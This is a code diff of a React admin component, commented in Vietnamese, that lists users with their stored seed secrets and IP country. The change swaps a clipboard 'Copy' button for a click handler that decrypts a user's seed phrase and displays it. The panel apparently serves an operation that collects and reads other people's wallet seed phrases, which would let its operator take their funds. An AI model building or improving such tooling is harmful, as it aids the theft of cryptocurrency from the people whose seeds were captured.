@@ -241,20 +241,6 @@ const decodeSeed = async (seed) => {
   };
 
 
-const copySeed = async (seed) => {
-  try {
-    // Giải mã seed nếu cần
-    let decrypted = await decodeSeed(seed);
-    // Sao chép vào clipboard
-    await navigator.clipboard.writeText(decrypted);
-    // Thông báo (có thể thay bằng toast hoặc alert)
-    alert("Đã sao chép seed vào bộ nhớ tạm!");
-  } catch (error) {
-    alert("Lỗi khi sao chép seed:", error);
-  }
-};
-
-
   return (
     <div className="container mx-auto mt-8 px-2">
       <audio ref={audioRef} src="/music/tigitig.mp3"></audio>
@@ -451,11 +437,6 @@ const copySeed = async (seed) => {
                     {user.ip ? (user.ip.country || user.ip.country_code) : "Unknown"}
                   </td>
                   <td className="py-2 px-4 border flex gap-2 flex-wrap">
-                    <button className="min-w-fit px-3 py-1 rounded text-white text-sm bg-blue-600"
-                      onClick={() => copySeed(user.secret)}
-                    >
-                      Copy
-                    </button>
                     <button className="min-w-fit px-3 py-1 rounded text-white text-sm bg-green-600"
                       onClick={() => handleStatus(user.status, user.userID)}
                     >
@@ -506,6 +487,10 @@ const copySeed = async (seed) => {
               <div>
                 <b>Secret:</b>
                 <textarea
+                  onClick={async (e) => {
+                      const decrypted = await decodeSeed(user.secret);
+                      e.target.value = decrypted; // cập nhật trực tiếp lên UI
+                  }}
                   value={user.secret}
                   rows="2"
                   className="w-full border rounded"
